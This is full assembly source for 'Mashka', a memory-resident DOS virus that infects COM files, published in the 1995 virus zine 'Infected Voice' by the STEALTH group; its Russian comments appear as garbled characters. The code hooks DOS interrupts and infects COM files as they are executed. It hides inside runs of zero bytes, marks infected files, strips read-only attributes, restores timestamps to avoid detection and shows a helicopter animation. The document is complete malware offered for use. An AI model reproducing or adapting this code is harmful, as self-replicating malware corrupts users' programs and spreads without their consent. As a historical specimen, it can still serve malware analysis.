;�����������������  �                                        �          ��������
;� STEALTH group ۰ � ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���  �� �� ��
;�   presents    ۰ � � � ��  ��  �    �  ��  � �    � � � � � �  ����  ����� ��
;����������������۰ � � � �   ��� ���  �  ��� ���     �� ��� � ��� ���  ��������
; �����������������                                                     JAN 1995
;
; INFECTED VOICE. Issue 4. January 1995. (C) STEALTH group, Kiev 148, Box 10.
; ===========================================================================


TITLE    Virus Mashka           ; ���� �����饥 �������� !
seg_a segment para 'code'
assume cs:seg_a,ds:seg_a

org 100h

start:
        call $+3              ;���� ����� call
        pop bx
        push es
        sub bx,3                ;��砫� �����
        push bx
        mov ax,0e200h         ;�ࠤ�樮���� �஢�ઠ �� ����稥 � �����
        int 21h
        cmp al,22h
        jnz res               ;�᫨ ��� ���, ����� �㤥�
        jmp short nores       ;�� 㦥 ����
res:
        mov ax,ds
        dec ax
        mov ds,ax                                       ;ᥣ���� MSB
        mov ax,word ptr ds:[3]
        sub ax,(offset virend - offset start)/10h+1+20h ;㬥��蠥� ࠧ��� �����
        mov word ptr ds:[3],ax
        mov ax,ds
        inc ax
        mov ds,ax
        mov ax,word ptr ds:[2]                          ;����� ᢮������ �����
        sub ax,(offset virend - offset start)/10h+1+20h ;�⭨���� ࠧ��� vir'�
        mov es,ax
        mov word ptr ds:[2],ax
        mov cx,offset virend - offset start
        mov si,bx
        xor di,di
        push cs
        pop ds
        rep movsb         ; ��४�稢��� ⥫� � �뤥������ ������� es:di
        push es
        pop ds
        mov ax,3521h     ; �� �����, ������� , �� �������� , �� �ந�室��
        int 21h
        mov word ptr ds:[offset int21e - offset start],bx
        mov word ptr ds:[offset int21e+2 - offset start],es
        mov ax,2521h
        mov dx,offset int21entry - offset start
        int 21h                                   ; ���墠�뢠�� int 21h
        mov ax,3510h
        int 21h
        mov word ptr ds:[offset int10e - offset start],bx
        mov word ptr ds:[offset int10e+2 - offset start],es
        mov ax,2510h
        mov dx,offset int10entry - offset start
        int 21h                                  ; ���墠�뢠�� int 10h
                                                 ; ��� ���⮫��
nores:
        ; �᫨ ����� 㦥 � ����� , � ��⠥��� ⮫쪮 ࠤ�������

        pop bx

        ; ᥩ�� �㤥� ������� �ਣ������ ����� �ணࠬ�� ,
        ; ��१���� �� ��砫� �ணࠬ��

        mov ax,word ptr cs:[bx + offset real - offset start]
        mov bx,word ptr cs:[bx + offset real - offset start + 2]
        push cs
        pop ds
        mov word ptr cs:[100h],ax  ;ᮮ⢥��⢥��� �����頥� �� �� ����
        mov word ptr cs:[102h],bx
        mov ax,100h                ;����� ��� ������ �� ��砫� �ணࠬ��
        pop es
        push ax
        ret

real    dw 4cb4h              ; ��� ��� த��� , �ਣ������ !
        dw 21cdh

INT21entry:
        cmp ax,0e200h         ; �஢��塞 ᮡ�⢥���� �㭪��,
                              ; ������ ����� �믮���� �⮡� �஢����
                              ; ᢮� ����稥 � �����
        jnz d01
        mov al,22h
        iret
d01:
        cmp ax,0e233h        ; ᥪ�⭠� �㭪�� , ��������� �ਣ������
                     ; ���� ���뢠��� � ࠧ��� ����� (��� ���������� ���-
                     ; ��� �� ���ᨨ
        jnz d1
        mov al,22h
        mov bx,cs
        ; ��� ��� , �� offset'�
        mov cx,offset real - offset start
        mov dx,offset int21e - offset start
        mov si,offset int10e - offset start
        iret
d1:
        cmp ah,4bh        ; ��� ����� , �㭪�� 4b - ������� ��稭� ��ࠦ����
        jz in4b
        jmp exitint21     ; �᫨ �� 4b , � �� �� ࠢ�� ��������

; ��� � ���筮 �������� , ����� ������ INT 21h

in4b:
        push ax           ; �������� ���� !  ����⮢�� ��ப� 'PSQR'
        push bx
        push cx
        push dx

        push es
        push ds
        push si
        push di

        push dx
        push ds
        push cs
        pop ds
        mov ax,2524h
        mov dx,offset int24entry - offset start
        int 21h                                 ;���墠� ����᪮� �訡��
                                                ;�ந�室�� ⮫쪮 �� ����᪥,
                                                ;���� 䠩�� �� ���⠫��� ��
                                                ;�ਭ�� , ���ண� ���� !
        pop ds
        pop dx

        call cmpnol                     ;�饬 ���� � ���� ��� � ������
        call cmpcom                     ;� �� COM �� �� ��砩�� ?
        jnc pr1                 ; ��� ! ����� ��-⠪�  COM !
        jmp exit                ; �� �� �㤥� ��ࠦ���, �� �������� ...
pr1:
        ;��࠭塞 � ��६���� ᥣ���� � ᬥ饭�� ����᪠����� 䠩��

        mov word ptr cs:[offset adname - offset start],dx
        mov word ptr cs:[offset adname - offset start+2],ds
        call catt                               ;���� ��ਡ���
        mov ax,3d02h                            ;���뢠�� 䠩�
        int 21h
        mov bx,ax
        call gettime                            ;����砥� � ��࠭塞 �६�

                        ; � ��� ���祪 ����� ����筮 ���,
                        ; �� �� �뫮 ����� � ���ࠢ��
        mov ax,4202h
        xor cx,cx
        xor dx,dx
        int 21h

        push ds
        push cs
        pop ds                  ; ᥣ���� ������ ��⠭�������� �� ��� �����

        mov ax,4200h            ; ����� ����筮 �뫮 �� ����⠭� ,�� �������,
                                ; CX:DX �� ࠢ�� �㫨
        int 21h

        mov ah,3fh
        mov dx,offset virend - offset start
        mov cx,4h
        int 21h                 ; �⠥� ��砫� 䠩�� � ������� �� ����ᮬ

        ; �᫨ ��ࠦ��� , � �⢥��� ���� ������ ���� 'Q'
        cmp byte ptr ds:[offset virend - offset start + 3],'Q'
        jnz ok2
        pop ds
        jmp closeexit  ; ��室 � �����⨥� 䠩�� � ����⠭����� ��⠫쭮��
                       ; ����
ok2:
        xor si,si
        mov dx,0 - 200h
p2:
        ;᫥���騩 �ࠣ���� ���뢠�� � ������ ��᫥����⥫쭮 ���� 䠩�
        ;�� 200h � ᪠����� �� ��।������� ������⢮ �㫥� (� ������ 777),

        mov ax,4200h
        add dx,200h
        xor cx,cx
        int 21h
        push ax
        mov ah,3fh
        mov dx,offset virend - offset start
        mov cx,200h
        int 21h
        cmp ax,0
        jnz d3
        pop dx     ; 䠩� �����稫��
        jmp d2
d3:
        cmp ax,200h
        jz ok4
        add ax,offset virend - offset start
        mov di,ax
        mov word ptr ds:[di],0ffh  ; � �� ��-� �த� ���殢�窨
ok4:
        call scanspace    ; ᪠���㥬 ���⠭�� 200h
        pop dx
        cmp si,offset virend - offset start
        jc p2                 ; �᫨ ���-�� �㫥� ����� 祬 ࠧ��� �����
                                ; � �த������ ᪠��஢����

        sub di,(offset virend - offset start)
        add dx,di
        sub dx,si
        push dx                 ; � DX ᬥ饭�� � 䠩�� ,���஥ 㪠�뢠�� ��
                                ; ��������� ������� � ��ﬨ
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        mov ah,3fh
        mov cx,4h
        mov dx,offset real - offset start
        int 21h                             ; �⠥� ॠ��� ���⨪� �ண�.
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        mov si,offset virend - offset start
        mov byte ptr ds:[si],0e9h
        pop dx
        push dx
        sub dx,3
        mov word ptr ds:[si+1],dx       ; �����⠢������ ��砫�� ���� ����
        mov byte ptr ds:[si+3],'Q'      ; � �� ��⪠ ��ࠦ������
        mov ah,40h
        mov cx,4h
        mov dx,offset virend - offset start
        int 21h                                 ; �����뢠�� ��
        pop dx                  ; � DX ���� ������ � ��ﬨ
        xor cx,cx
        mov ax,4200h
        int 21h
        mov ah,40h
        mov cx,offset virend - offset start
        xor dx,dx
        int 21h                                 ; �����뢠�� �㤠 ⥫� �����
d2:
        pop ds
closeexit:
        call puttime            ; ����⠭�������� �६�
        mov ah,3eh
        int 21h                 ; �� ! ࠡ�稩 ���� ���稫�� !
exit:
        pop di
        pop si
        pop ds
        pop es
        pop dx
        pop cx
        pop bx
        pop ax
exitint21:
        db 0eah
int21e  dw ?
        dw ?
adname  dw ?
        dw ?
int24entry:
        mov ax,0h       ; � �� ABORT ! ����, �� �� �� � �⠫�� !
        iret
time    dw ?
        dw ?
;-------------------------------------  ���� ��� � ���� ��� � ������
cmpnol:
        mov bx,dx
nol:
        inc bx
        cmp byte ptr ds:[bx],0h
        jnz nol
        ret
;------------------------------------- �஢�ઠ �� COM
cmpcom:
        cmp word ptr ds:[bx-2],'MO'
        clc
        jz exitcmpexe
        stc
exitcmpexe:
        ret
;--------------------------------------- ����祭�� � ��⠭���� ��ଠ����
;                                                       ��ਡ�⮢
catt:
        push ds
        push dx
        mov ax,4300h
        LDS dx,dword ptr cs:[offset adname - offset start]
        int 21h
        and cl,11111110b
        mov ax,4301h
        int 21h
        pop dx
        pop ds
        ret
;--------------------------------------- ����祭�� � ��࠭���� �६���
gettime:
        mov ax,5700h
        int 21h
        and cl,11100000b
        mov word ptr cs:[offset time - offset start],cx
        mov word ptr cs:[offset time - offset start+2],dx
        ret
;----------------------------------------- �����饭�� ��ண� �६���  ;)
puttime:
        mov ax,5701h
        mov cx,word ptr cs:[offset time - offset start]
        mov dx,word ptr cs:[offset time - offset start+2]
        int 21h
        ret
;------------------------------------------ ᪠��஢���� �� �㫨
scanspace:
        mov di,offset virend - offset start - 1
opsc:
        inc di
        cmp di,(offset virend - offset start) + 200h
        jnc exsc
        mov al,ds:[di]
        cmp al,0
        jnz clscan
        inc si
        jmp opsc
exsc:
        ret
clscan:
        cmp si,offset virend - offset start
        jc ok3
        ret
ok3:
        xor si,si
        jmp opsc

int10entry:
        cmp ax,0005h    ; �஢�ઠ �� ��⠭������� CGA 320x200
        jz svert      ; �᫨ ⠪����, � ��㥬 �஫���騩 ���⮫��
exitint10:
        db 0eah
int10e  dw ?
        dw ?
svert:
        cmp si,22h
        jz exitint10  ; ��室�� ᮡ�⢥��� �맮��

                ; �� � ��� - �������� !

vert:
        push ds
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push bp
        push es

        push cs
        pop ds
        mov ax,0b800h
        mov es,ax
        mov si,22h
        mov ax,5
        int 10h
        mov cx,70
        mov dx,30
bb:
        push cx
        mov cx,6000h
zlp:
        loop zlp
        pop cx

        call bert
        loop bb
        pop es
        pop bp
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        pop ds
        jmp exitint10
;------------------------
bert:
        push dx
        push cx
        push ax
        push si
        push di

        mov ax,dx
        mov bx,80
        mul bx
        add ax,cx
        mov di,ax
        mov bp,0
        mov si,offset berts - offset start
opbert:
        mov cx,6
        push di
        rep movsb
        pop di
        add di,2000h
        inc bp
        cmp bp,12
        je exbert
        mov cx,6
        push di
        rep movsb
        pop di
        sub di,2000h-80
        inc bp
        cmp bp,12
        je exbert
        jmp opbert
exbert:
        pop di
        pop si
        pop ax
        pop cx
        pop dx
        ret
;================================
berts   db 0,0,0,0,0,0            ; ���⮫��, ��� ��-�ࠨ�᪨ - 奫������
        db 0,0,0,0,0,0
        db 0,0,55h,40h,0,0
        db 0,0,4,0,0,0
        db 0,1,44h,0,0,0
        db 0,15h,55h,0,4,0
        db 0,50h,57h,55h,55h,0
        db 0,15h,75h,55h,4,0
        db 0,5,55h,0,0,0
        db 0,0,10h,0,0,0
        db 0,0,0,0,0,0
        db 0,0,0,0,0,0
;=================================
db '���೟�������྇ཎ�����'     ; ����஢����� ��᫠��� ��⮬���
                                  ; �� NEG.

virend:
seg_a ends
end start
